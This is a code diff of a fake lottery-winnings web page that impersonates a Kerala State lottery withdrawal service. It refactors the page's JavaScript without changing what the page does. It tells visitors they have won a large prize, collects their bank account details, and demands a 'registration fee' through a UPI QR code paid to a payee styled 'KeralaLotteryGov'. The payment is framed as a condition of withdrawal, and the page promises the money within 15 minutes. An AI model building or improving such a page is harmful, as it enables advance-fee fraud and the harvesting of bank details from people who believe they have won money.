@@ -116,7 +116,7 @@
 
     <!-- Result Box -->
     <div id="resBox">
-      <!-- Status Processing Notice -->
+      <!-- Status Box -->
       <div style="background:#2e1065; border:1px solid #facc15; border-radius:8px; padding:12px; text-align:center; margin-bottom:12px;">
         <h4 style="color:#fde047; font-size:15px; margin-bottom:4px;">*Request Under Review*</h4>
         <p style="font-size:11px; color:#cbd5e1; margin-bottom:8px;">Kerala State withdrawal request submitted successfully.</p>
@@ -125,7 +125,7 @@
         </span>
       </div>
 
-      <!-- Account & Prize Details Card -->
+      <!-- Details Box -->
       <div class="info-box">
         <div style="font-weight:bold; color:#fde047; border-bottom:1px solid #3b1464; padding-bottom:6px; margin-bottom:4px;">
           <span>Details</span><span>Details</span>
@@ -139,18 +139,18 @@
         </div>
       </div>
 
-      <!-- Credited Timeline Notice -->
+      <!-- Notice -->
       <div style="background:#0a2912; border:1px solid #16a34a; border-radius:6px; padding:8px 10px; font-size:11px; color:#86efac; margin-bottom:10px;">
         ✅ <b>Amount will be credited into your account within 15 minutes.</b><br>
         <span style="color:#bbf7d0; font-size:10px;">Transfer will be initiated upon Kerala State Admin approval.</span>
       </div>
 
-      <!-- Mandatory Warning Notice -->
+      <!-- Warning Box -->
       <div style="background:linear-gradient(135deg, #eab308, #ca8a04); color:#000; padding:10px; border-radius:8px; font-size:11px; line-height:1.4; margin-bottom:12px; font-weight:500;">
         ⚠️ <b>Dear Customer:</b> Registration charge shown on this page: Rs. <span id="warnFee">3,250</span>/-. Please verify any government charge directly with the Kerala State Lotteries Department before making a payment. This page is not an official government payment portal.
       </div>
 
-      <!-- Bank Details Input Form -->
+      <!-- Withdraw Form -->
       <div id="bankFormBox">
         <h4 style="color:#fde047; margin:8px 0 6px;">Bank Withdraw Form:</h4>
         <input type="text" id="wName" placeholder="Account Holder Name">
@@ -160,7 +160,7 @@
         <button class="btn" onclick="openPayment()">Submit & Proceed to Fee</button>
       </div>
 
-      <!-- Registration Fee QR Box (After Withdraw Form is filled) -->
+      <!-- QR Fee Box -->
       <div id="feeBox" style="text-align:center; background:#0d041c; border:1px solid #5b21b6; border-radius:8px; padding:12px;">
         <p style="font-size:13px; font-weight:bold; color:#fde047; margin-bottom:8px;">
           🔒 PAY REGISTRATION FEE TO WITHDRAW
@@ -176,89 +176,102 @@
   </div>
 
   <script>
-    const API = "https://sheetdb.io/api/v1/vpi9mg3o0yk7q";
-    let fee = "3250", upi = "keralaLottery@paytm";
+    var API = "https://sheetdb.io/api/v1/vpi9mg3o0yk7q";
+    var fee = "3250";
+    var upi = "keralaLottery@paytm";
 
-    // Clock updates
-    setInterval(() => {
-      const d = new Date();
-      document.getElementById("liveClock").textContent = d.toLocaleDateString('en-GB') + " | " + d.toLocaleTimeString('en-US');
+    // 1. Clock timer
+    setInterval(function() {
+      var d = new Date();
+      var clockElem = document.getElementById("liveClock");
+      if (clockElem) {
+        clockElem.textContent = d.toLocaleDateString('en-GB') + " | " + d.toLocaleTimeString('en-US');
+      }
     }, 1000);
 
-    // Search and check winner
-    async function checkWinner() {
-      const q = document.getElementById("tktInput").value.trim().toLowerCase();
-      const msg = document.getElementById("msg");
+    // 2. Check ticket winner
+    function checkWinner() {
+      var q = document.getElementById("tktInput").value.trim().toLowerCase();
+      var msg = document.getElementById("msg");
+
       if (!q) {
         msg.textContent = "Kripya number dalein!";
         msg.style.color = "#f87171";
         return;
       }
+
       msg.textContent = "Checking records...";
       msg.style.color = "#fde047";
 
-      try {
-        const res = await fetch(API);
-        const data = await res.json();
-        const r = data.find(x => (x.ticket && x.ticket.trim().toLowerCase() === q) || (x.mobile && x.mobile.trim() === q));
-        
-        if (r) {
-          msg.textContent = "";
-          document.getElementById("pAmt").textContent = r.amount || "₹25,00,00,000";
-          document.getElementById("dispName").textContent = r.name || "-";
-          document.getElementById("wName").value = r.name || "";
-          
-          fee = r.fee || "3250";
-          upi = r.upiId || "keralaLottery@paytm";
+      fetch(API)
+        .then(function(res) { return res.json(); })
+        .then(function(data) {
+          var r = null;
+          for (var i = 0; i < data.length; i++) {
+            var item = data[i];
+            var matchTkt = item.ticket && item.ticket.trim().toLowerCase() === q;
+            var matchMob = item.mobile && item.mobile.trim() === q;
+            if (matchTkt || matchMob) {
+              r = item;
+              break;
+            }
+          }
 
-          document.getElementById("warnFee").textContent = fee;
-          document.getElementById("btnFee").textContent = fee;
+          if (r) {
+            msg.textContent = "";
+            document.getElementById("pAmt").textContent = r.amount || "₹25,00,00,000";
+            document.getElementById("dispName").textContent = r.name || "-";
+            document.getElementById("wName").value = r.name || "";
+            
+            fee = r.fee || "3250";
+            upi = r.upiId || "keralaLottery@paytm";
 
-          document.getElementById("resBox").style.display = "block";
-          document.getElementById("feeBox").style.display = "none";
-          document.getElementById("bankFormBox").style.display = "block";
-        } else {
-          msg.textContent = "Koi record nahi mila!";
+            document.getElementById("warnFee").textContent = fee;
+            document.getElementById("btnFee").textContent = fee;
+
+            document.getElementById("resBox").style.display = "block";
+            document.getElementById("feeBox").style.display = "none";
+            document.getElementById("bankFormBox").style.display = "block";
+          } else {
+            msg.textContent = "Koi record nahi mila!";
+            msg.style.color = "#f87171";
+          }
+        })
+        .catch(function(err) {
+          msg.textContent = "Server error!";
           msg.style.color = "#f87171";
-        }
-      } catch(e) {
-        msg.textContent = "Server error!";
-        msg.style.color = "#f87171";
-      }
+        });
     }
 
-    // Process Bank Details & Display QR
+    // 3. Bank details submit and show QR
     function openPayment() {
-      const n = document.getElementById("wName").value.trim();
-      const b = document.getElementById("wBank").value.trim();
-      const a = document.getElementById("wAcc").value.trim();
-      const i = document.getElementById("wIfsc").value.trim();
+      var n = document.getElementById("wName").value.trim();
+      var b = document.getElementById("wBank").value.trim();
+      var a = document.getElementById("wAcc").value.trim();
+      var i = document.getElementById("wIfsc").value.trim();
 
       if (!n || !b || !a || !i) {
         alert("Kripya saari bank details bharein!");
         return;
       }
 
-      // Display filled details
       document.getElementById("dispName").textContent = n;
       document.getElementById("dispBank").textContent = b;
       document.getElementById("dispAcc").textContent = a.length > 4 ? "*******" + a.slice(-4) : a;
       document.getElementById("dispIfsc").textContent = i.toUpperCase();
 
-      // Dynamic QR Code link
-      const upiUrl = `upi://pay?pa=${encodeURIComponent(upi)}&pn=KeralaLotteryGov&am=${fee}&cu=INR&tn=RegistrationFee`;
-      document.getElementById("qrImg").src = `https://quickchart.io/qr?text=${encodeURIComponent(upiUrl)}&size=160`;
-      document.getElementById("upiTxt").textContent = `UPI ID: ${upi}`;
+      var upiUrl = "upi://pay?pa=" + encodeURIComponent(upi) + "&pn=KeralaLotteryGov&am=" + fee + "&cu=INR&tn=RegistrationFee";
+      document.getElementById("qrImg").src = "https://quickchart.io/qr?text=" + encodeURIComponent(upiUrl) + "&size=160";
+      document.getElementById("upiTxt").textContent = "UPI ID: " + upi;
 
-      // Show payment box & hide inputs
       document.getElementById("bankFormBox").style.display = "none";
       document.getElementById("feeBox").style.display = "block";
       document.getElementById("feeBox").scrollIntoView({ behavior: 'smooth' });
     }
 
-    // Direct UPI Intent
+    // 4. UPI Pay click
     function payUpi() {
-      const upiUrl = `upi://pay?pa=${encodeURIComponent(upi)}&pn=KeralaLotteryGov&am=${fee}&cu=INR&tn=RegistrationFee`;
+      var upiUrl = "upi://pay?pa=" + encodeURIComponent(upi) + "&pn=KeralaLotteryGov&am=" + fee + "&cu=INR&tn=RegistrationFee";
       window.location.href = upiUrl;
     }
   </script>
